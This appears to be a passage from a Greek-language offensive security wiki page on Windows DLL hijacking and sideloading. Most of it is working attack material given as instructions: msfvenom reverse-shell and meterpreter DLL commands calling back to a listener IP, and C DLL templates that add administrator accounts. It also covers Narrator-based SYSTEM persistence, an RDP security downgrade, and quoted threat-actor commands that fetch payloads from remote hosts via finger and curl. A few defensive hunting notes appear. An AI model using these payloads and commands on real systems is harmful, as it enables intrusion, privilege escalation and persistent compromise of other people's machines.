Σε περίπτωση που εντοπίσετε ένα exploitable σενάριο, ένα από τα σημαντικότερα πράγματα για να το εκμεταλλευτείτε επιτυχώς θα ήταν να **δημιουργήσετε ένα dll που κάνει export τουλάχιστον όλων των functions που το executable θα κάνει import από αυτό**. Σε κάθε περίπτωση, σημειώστε ότι το Dll Hijacking είναι χρήσιμο για **privilege escalation** από επίπεδο Medium Integrity σε High **(bypassing UAC)** ή από **High Integrity σε SYSTEM**. Μπορείτε να βρείτε ένα παράδειγμα για το **πώς να δημιουργήσετε ένα valid dll** μέσα σε αυτή τη μελέτη για το dll hijacking, εστιασμένη στο dll hijacking για execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότη**τα μπορείτε να βρείτε μερικά **basic dll codes** που μπορεί να φανούν χρήσιμα ως **templates** ή για τη δημιουργία ενός **dll με exported functions που δεν απαιτούνται**.

## **Δημιουργία και compilation Dlls**

### **Dll Proxifying**

Βασικά, ένα **Dll proxy** είναι ένα Dll που μπορεί να **εκτελεί τον malicious κώδικά σας όταν φορτώνεται**, αλλά επίσης να **εκθέτει** και να **λειτουργεί** όπως **αναμένεται**, κάνοντας **relay όλων των calls προς την πραγματική library**.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε να **υποδείξετε ένα executable και να επιλέξετε τη library** που θέλετε να κάνετε proxify και να **δημιουργήσετε ένα proxified dll** ή να **υποδείξετε το Dll** και να **δημιουργήσετε ένα proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Αποκτήστε ένα meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιουργία χρήστη (x86, δεν είδα έκδοση x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Δικό σας

Σε πολλές περιπτώσεις, το DLL που μεταγλωττίζετε πρέπει να **εξάγει κάθε function που εισάγεται από το victim process**. Αν λείπει κάποιο απαιτούμενο export, το binary δεν μπορεί να το επιλύσει και το exploit αποτυγχάνει.

<details>
<summary>Πρότυπο C DLL (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Παράδειγμα C++ DLL με δημιουργία χρήστη</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Εναλλακτικό C DLL με σημείο εισόδου thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Μελέτη περίπτωσης: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Το Windows Narrator.exe εξακολουθεί κατά την εκκίνηση να αναζητά ένα προβλέψιμο, συγκεκριμένο για τη γλώσσα localization DLL, το οποίο μπορεί να γίνει hijack για arbitrary code execution και persistence.<sup>[[7]](#references)</sup>

Βασικά στοιχεία
- Probe path (τρέχουσες builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (παλαιότερες builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Αν υπάρχει writable attacker-controlled DLL στο OneCore path, φορτώνεται και εκτελείται το `DllMain(DLL_PROCESS_ATTACH)`. Δεν απαιτούνται exports.

Discovery με Procmon
- Filter: `Process Name is Narrator.exe` και `Operation is Load Image` ή `CreateFile`.
- Εκκινήστε το Narrator και παρατηρήστε την απόπειρα φόρτωσης του παραπάνω path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Ένα naive hijack θα μιλήσει/θα επισημάνει στοιχεία του UI. Για να παραμείνει αθόρυβο, κατά την προσάρτηση απαριθμήστε τα threads του Narrator, ανοίξτε το κύριο thread (`OpenThread(THREAD_SUSPEND_RESUME)`) και εκτελέστε `SuspendThread` σε αυτό· συνεχίστε στο δικό σας thread. Δείτε το PoC για τον πλήρη κώδικα.<sup>[[8]](#references)</sup>

Trigger και persistence μέσω ρυθμίσεων Accessibility
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Με τα παραπάνω, η εκκίνηση του Narrator φορτώνει το planted DLL. Στο secure desktop (οθόνη σύνδεσης), πατήστε CTRL+WIN+ENTER για να ξεκινήσει το Narrator· το DLL σας εκτελείται ως SYSTEM στο secure desktop.

Εκτέλεση SYSTEM μέσω RDP (lateral movement)
- Επιτρέψτε το classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Συνδεθείτε μέσω RDP στον host και, στην οθόνη σύνδεσης, πατήστε CTRL+WIN+ENTER για να εκκινήσετε το Narrator· το DLL σας εκτελείται ως SYSTEM στο secure desktop.
- Η εκτέλεση σταματά όταν κλείσει το RDP session — κάντε inject/migrate άμεσα.

Bring Your Own Accessibility (BYOA)
- Μπορείτε να κλωνοποιήσετε μια ενσωματωμένη καταχώρηση Accessibility Tool (AT) (π.χ. CursorIndicator), να την επεξεργαστείτε ώστε να δείχνει σε ένα arbitrary binary/DLL, να την εισαγάγετε και έπειτα να ορίσετε το `configuration` σε αυτό το όνομα AT. Αυτό λειτουργεί ως proxy για arbitrary execution υπό το Accessibility framework.

Σημειώσεις
- Η εγγραφή κάτω από το `%windir%\System32` και η αλλαγή τιμών HKLM απαιτούν δικαιώματα administrator.
- Όλη η λογική του payload μπορεί να βρίσκεται στο `DLL_PROCESS_ATTACH`· δεν απαιτούνται exports.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Αυτή η περίπτωση παρουσιάζει **Phantom DLL Hijacking** στο Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), το οποίο καταγράφεται ως **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: Το `TPQMAssistant.exe`, που βρίσκεται στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: Το `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` εκτελείται καθημερινά στις 9:30 π.μ. υπό το context του logged-on user.
- **Directory Permissions**: Είναι writable από τον `CREATOR OWNER`, επιτρέποντας σε local users να αποθέσουν arbitrary files.
- **DLL Search Behavior**: Επιχειρεί να φορτώσει το `hostfxr.dll` πρώτα από το working directory του και καταγράφει "NAME NOT FOUND" όταν λείπει, γεγονός που υποδεικνύει precedence στην αναζήτηση του local directory.

### Exploit Implementation

Ένας attacker μπορεί να τοποθετήσει ένα malicious `hostfxr.dll` stub στον ίδιο κατάλογο, εκμεταλλευόμενος το missing DLL για να επιτύχει code execution υπό το context του user:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Εξέλιξη επίθεσης

1. Ως standard user, τοποθετήστε το `hostfxr.dll` στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περιμένετε να εκτελεστεί το scheduled task στις 9:30 π.μ. στο context του τρέχοντος χρήστη.
3. Αν ένας administrator είναι συνδεδεμένος όταν εκτελείται το task, το malicious DLL εκτελείται στο session του administrator με medium integrity.
4. Συνδυάστε τυπικές τεχνικές UAC bypass για ανύψωση από medium integrity σε SYSTEM privileges.

## Μελέτη περίπτωσης: MSI CustomAction Dropper + DLL Side-Loading μέσω Signed Host (wsc_proxy.exe)

Οι threat actors συνδυάζουν συχνά MSI-based droppers με DLL side-loading για να εκτελέσουν payloads υπό ένα trusted, signed process.<sup>[[10]](#references)</sup>

Επισκόπηση αλυσίδας
- Ο χρήστης κατεβάζει ένα MSI. Ένα CustomAction εκτελείται αθόρυβα κατά την εγκατάσταση μέσω GUI (π.χ. μια ενέργεια LaunchApplication ή VBScript), ανακατασκευάζοντας το επόμενο stage από embedded resources.
- Το dropper γράφει ένα legitimate, signed EXE και ένα malicious DLL στον ίδιο directory (παράδειγμα ζεύγους: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Όταν εκκινηθεί το signed EXE, το Windows DLL search order φορτώνει πρώτα το wsc.dll από το working directory, εκτελώντας attacker code υπό έναν signed parent (ATT&CK T1574.001).

Ανάλυση MSI (τι να αναζητήσετε)
- Πίνακας CustomAction:
- Αναζητήστε entries που εκτελούν executables ή VBScript. Παράδειγμα ύποπτου pattern: LaunchApplication που εκτελεί ένα embedded file στο background.
- Στο Orca (Microsoft Orca.exe), επιθεωρήστε τους πίνακες CustomAction, InstallExecuteSequence και Binary.
- Embedded/split payloads στο MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ή χρησιμοποιήστε το lessmsi: lessmsi x package.msi C:\out
- Αναζητήστε πολλαπλά μικρά fragments που ενώνονται και αποκρυπτογραφούνται από ένα VBScript CustomAction. Συνήθης ροή:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Πρακτικό sideloading με wsc_proxy.exe
- Τοποθέτησε αυτά τα δύο αρχεία στον ίδιο φάκελο:
- wsc_proxy.exe: νόμιμο υπογεγραμμένο host (Avast). Η διεργασία προσπαθεί να φορτώσει το wsc.dll βάσει ονόματος από τον κατάλογό της.
- wsc.dll: DLL του attacker. Αν δεν απαιτούνται συγκεκριμένα exports, αρκεί το DllMain· διαφορετικά, δημιούργησε ένα proxy DLL και προώθησε τα απαιτούμενα exports στη γνήσια βιβλιοθήκη, εκτελώντας παράλληλα το payload στο DllMain.
- Δημιούργησε ένα minimal DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Για απαιτήσεις export, χρησιμοποιήστε ένα proxying framework (π.χ. DLLirant/Spartacus) για να δημιουργήσετε ένα forwarding DLL που εκτελεί επίσης το payload σας.

- Αυτή η technique βασίζεται στην επίλυση ονομάτων DLL από το host binary. Αν το host χρησιμοποιεί absolute paths ή safe loading flags (π.χ. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), το hijack μπορεί να αποτύχει.
- Τα KnownDLLs, SxS και τα forwarded exports μπορούν να επηρεάσουν την προτεραιότητα και πρέπει να λαμβάνονται υπόψη κατά την επιλογή του host binary και του export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Η Check Point περιέγραψε τον τρόπο με τον οποίο το Ink Dragon αναπτύσσει το ShadowPad χρησιμοποιώντας ένα **three-file triad**, ώστε να μοιάζει με legitimate software, διατηρώντας παράλληλα το core payload κρυπτογραφημένο στον δίσκο:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – γίνεται κατάχρηση vendors όπως οι AMD, Realtek ή NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Οι attackers μετονομάζουν το executable ώστε να μοιάζει με Windows binary (για παράδειγμα `conhost.exe`), αλλά η Authenticode signature παραμένει έγκυρη.
2. **Malicious loader DLL** – αποτίθεται δίπλα στο EXE με το αναμενόμενο όνομα (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Το DLL είναι συνήθως ένα MFC binary obfuscated με το ScatterBrain framework· ο μοναδικός του ρόλος είναι να εντοπίσει το encrypted blob, να το αποκρυπτογραφήσει και να κάνει reflective mapping στο ShadowPad.
3. **Encrypted payload blob** – συχνά αποθηκεύεται ως `<name>.tmp` στον ίδιο directory. Μετά το memory-mapping του decrypted payload, ο loader διαγράφει το TMP file για να καταστρέψει τα forensic evidence.

Tradecraft notes:

* Η μετονομασία του signed EXE (διατηρώντας το αρχικό `OriginalFileName` στο PE header) του επιτρέπει να μεταμφιέζεται σε Windows binary, διατηρώντας παράλληλα τη vendor signature. Επομένως, αναπαραγάγετε τη συνήθεια του Ink Dragon να αποθέτει binaries που μοιάζουν με `conhost.exe`, αλλά στην πραγματικότητα είναι AMD/NVIDIA utilities.
* Επειδή το executable παραμένει trusted, τα περισσότερα allowlisting controls χρειάζεται απλώς να επιτρέπουν στο malicious DLL να βρίσκεται δίπλα του. Εστιάστε στην προσαρμογή του loader DLL· το signed parent συνήθως μπορεί να εκτελεστεί χωρίς αλλαγές.
* Ο decryptor του ShadowPad αναμένει το TMP blob να βρίσκεται δίπλα στον loader και να είναι writable, ώστε να μπορεί να κάνει zero το file μετά το mapping. Διατηρήστε τον directory writable μέχρι να φορτωθεί το payload· μόλις βρίσκεται στη memory, το TMP file μπορεί με ασφάλεια να διαγραφεί για OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Οι operators συνδυάζουν το DLL sideloading με το LOLBAS, ώστε το μοναδικό custom artifact στον δίσκο να είναι το malicious DLL δίπλα στο trusted EXE:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Το hidden PowerShell κάνει spawn το `cmd.exe /c`, λαμβάνει commands από έναν Finger server και τα διοχετεύει στο `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- Το `finger user@host` λαμβάνει text μέσω TCP/79· το `| cmd` εκτελεί την απόκριση του server, επιτρέποντας στους operators να αλλάζουν το second stage server-side.

- **Built-in download/extract:** Κατεβάστε ένα archive με benign extension, κάντε unpack και κάντε stage το sideload target μαζί με το DLL σε έναν random `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- Το `curl -s -L` αποκρύπτει την πρόοδο και ακολουθεί redirects· το `tar -xf` χρησιμοποιεί το built-in tar των Windows.

- **WMI/CIM launch:** Εκκινήστε το EXE μέσω WMI, ώστε τα telemetry να εμφανίζουν μια CIM-created process ενώ φορτώνει το colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Λειτουργεί με binaries που προτιμούν local DLLs (π.χ. `intelbq.exe`, `nearby_share.exe`)· το payload (π.χ. Remcos) εκτελείται με το trusted name.

- **Hunting:** Δημιουργήστε alert για `forfiles` όταν τα `/p`, `/m` και `/c` εμφανίζονται μαζί· αυτό είναι ασυνήθιστο εκτός admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Μια πρόσφατη intrusion του Lotus Blossom έκανε κατάχρηση μιας trusted update chain για να παραδώσει ένα NSIS-packed dropper, το οποίο έκανε stage ένα DLL sideload μαζί με πλήρως in-memory payloads.<sup>[[13]](#references)</sup>

Tradecraft flow
- Το `update.exe` (NSIS) δημιουργεί το `%AppData%\Bluetooth`, το επισημαίνει ως **HIDDEN**, αποθέτει ένα renamed Bitdefender Submission Wizard `BluetoothService.exe`, ένα malicious `log.dll` και ένα encrypted blob `BluetoothService`, και στη συνέχεια εκκινεί το EXE.
- Το host EXE κάνει import το `log.dll` και καλεί τα `LogInit`/`LogWrite`. Το `LogInit` κάνει mmap-load το blob· το `LogWrite` το αποκρυπτογραφεί με ένα custom LCG-based stream (constants **0x19660D** / **0x3C6EF35F**, με key material που προέρχεται από προηγούμενο hash), κάνει overwrite το buffer με plaintext shellcode, απελευθερώνει τα temporary objects και κάνει jump σε αυτό.
- Για την αποφυγή IAT, ο loader κάνει resolve τα APIs μέσω hashing των export names, χρησιμοποιώντας **FNV-1a basis 0x811C9DC5 + prime 0x100019** και στη συνέχεια ένα Murmur-style avalanche (**0x85EBCA6B**), συγκρίνοντας το αποτέλεσμα με salted target hashes.

Main shellcode (Chrysalis)
- Αποκρυπτογραφεί ένα PE-like main module μέσω επαναλαμβανόμενων add/XOR/sub με το key `gQ2JR&9;` σε πέντε passes και στη συνέχεια φορτώνει δυναμικά το `Kernel32.dll` → `GetProcAddress` για να ολοκληρώσει το import resolution.
- Ανακατασκευάζει τα DLL name strings κατά το runtime μέσω per-character bit-rotate/XOR transforms και στη συνέχεια φορτώνει τα `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Χρησιμοποιεί έναν δεύτερο resolver που διασχίζει το **PEB → InMemoryOrderModuleList**, αναλύει κάθε export table σε blocks των 4 bytes με Murmur-style mixing και κάνει fallback στο `GetProcAddress` μόνο αν δεν βρεθεί το hash.

Embedded configuration & C2
- Το Config βρίσκεται μέσα στο dropped `BluetoothService` file στο **offset 0x30808** (size **0x980**) και αποκρυπτογραφείται με RC4 χρησιμοποιώντας το key `qwhvb^435h&*7`, αποκαλύπτοντας το C2 URL και το User-Agent.
- Τα beacons δημιουργούν ένα dot-delimited host profile, προσθέτουν ως prefix το tag `4Q` και στη συνέχεια το κρυπτογραφούν με RC4 χρησιμοποιώντας το key `vAuig34%^325hGV`, πριν από το `HttpSendRequestA` μέσω HTTPS. Οι responses αποκρυπτογραφούνται με RC4 και γίνονται dispatch μέσω ενός tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Το execution mode καθορίζεται από τα CLI args: χωρίς args = install persistence (service/Run key) που δείχνει στο `-i`· το `-i` κάνει relaunch τον εαυτό του με `-k`· το `-k` παρακάμπτει το install και εκτελεί το payload.

Alternate loader observed
- Η ίδια intrusion έκανε drop το Tiny C Compiler και εκτέλεσε το `svchost.exe -nostdlib -run conf.c` από το `C:\ProgramData\USOShared\`, με το `libtcc.dll` δίπλα του. Το C source που παρείχε ο attacker περιείχε embedded shellcode, έγινε compile και εκτελέστηκε in-memory χωρίς να γραφτεί PE στον δίσκο. Αναπαραγάγετε με:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Αυτό το στάδιο compile-and-run που βασίζεται σε TCC έκανε import το `Wininet.dll` κατά το runtime και κατέβαζε ένα shellcode δεύτερου σταδίου από ένα hardcoded URL, παρέχοντας έναν ευέλικτο loader που μεταμφιεζόταν ως εκτέλεση compiler.

## Signed-host sideloading with export proxying + host thread parking

Ορισμένες αλυσίδες DLL sideloading προσθέτουν **stability engineering**, ώστε ο legitimate host να παραμένει ενεργός αρκετά ώστε να φορτώσει καθαρά τα επόμενα stages, αντί να καταρρεύσει μετά τη φόρτωση του malicious DLL.<sup>[[11]](#references)</sup>

Observed pattern
- Τοποθέτηση ενός trusted EXE δίπλα σε ένα malicious DLL, χρησιμοποιώντας το αναμενόμενο όνομα dependency, όπως `version.dll`.
- Το malicious DLL κάνει **proxy κάθε αναμενόμενο export** προς το πραγματικό system DLL (για παράδειγμα `%SystemRoot%\\System32\\version.dll`), ώστε το import resolution να συνεχίζει να πετυχαίνει και η host process να εξακολουθεί να λειτουργεί.
- Μετά τη φόρτωση, το malicious DLL κάνει **patch το host entry point**, ώστε το main thread να μπαίνει σε έναν infinite `Sleep` loop αντί να τερματίζει ή να εκτελεί code paths που θα τερμάτιζαν τη process.
- Ένα νέο thread εκτελεί την πραγματική malicious εργασία: αποκρυπτογραφεί το όνομα ή το path του επόμενου-stage DLL (τα RC4/XOR είναι συνηθισμένα) και στη συνέχεια το εκκινεί με `LoadLibrary`.

Why this matters
- Το κανονικό DLL proxying διατηρεί τη συμβατότητα API, αλλά δεν εγγυάται ότι ο host θα παραμείνει ενεργός αρκετά ώστε να ολοκληρωθούν τα επόμενα stages.
- Το parking του main thread σε `Sleep(INFINITE)` είναι ένας απλός τρόπος για να διατηρηθεί η signed process resident, ενώ ο loader εκτελεί decryption, staging ή network bootstrap σε worker thread.
- Το hunting μόνο για ένα ύποπτο `DllMain` μπορεί να χάσει αυτό το pattern, αν η ενδιαφέρουσα συμπεριφορά συμβαίνει αφού γίνει patch το host entry point και ξεκινήσει ένα secondary thread.

Minimal workflow
1. Αντιγραφή του signed host EXE και προσδιορισμός του DLL που κάνει resolve από το local directory.
2. Δημιουργία ενός proxy DLL που κάνει export τις ίδιες functions και τις προωθεί στο legitimate DLL.
3. Στο `DllMain(DLL_PROCESS_ATTACH)`, δημιουργία ενός worker thread.
4. Από αυτό το thread, patch του host entry point ή του main thread start routine, ώστε να κάνει loop στο `Sleep`.
5. Αποκρυπτογράφηση του ονόματος/config του επόμενου-stage DLL και κλήση του `LoadLibrary` ή manual-map του payload.

Defensive pivots
- Signed processes που φορτώνουν το `version.dll` ή παρόμοιες common libraries από το δικό τους application directory αντί για το `System32`.
- Memory patches στο process entry point λίγο μετά το image load, ειδικά jumps/calls που ανακατευθύνονται στα `Sleep`/`SleepEx`.
- Threads που δημιουργούνται από proxy DLL και κάνουν αμέσως call στο `LoadLibrary` για ένα δεύτερο DLL με decrypted name.
- Full-export proxy DLLs που τοποθετούνται δίπλα σε vendor executables μέσα σε writable staging directories, όπως `ProgramData`, `%TEMP%` ή paths από unpacked archives.

## References

- [1] [Red Canary – Intelligence Insights: Ιανουάριος 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking στα Windows. Απλό παράδειγμα σε C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Ο Nimbus Manticore αναπτύσσει νέο malware που στοχεύει την Ευρώπη](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: Όταν τα DLL Hijacks συναντούν τα Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Ανατομία εξελισσόμενων εκστρατειών impersonation που διανέμουν το Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Ανάλυση threat clusters που στοχεύουν μια κυβέρνηση της Νοτιοανατολικής Ασίας](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Αποκαλύπτοντας το relay network και την εσωτερική λειτουργία μιας stealthy offensive operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: Μια βαθιά ανάλυση του toolkit του Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Tracking Iranian APT Screening Serpens’ 2026 Espionage Campaigns](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – στοιχείο `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – στοιχείο `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – στοιχείο `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – στοιχείο `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – στοιχείο `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – στοιχείο `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Οι επιχειρήσεις του Nimbus Manticore κατά τη διάρκεια της ιρανικής σύγκρουσης](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – Ο CL-STA-1062 στοχεύει κυβερνήσεις και critical infrastructure της Νοτιοανατολικής Ασίας](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
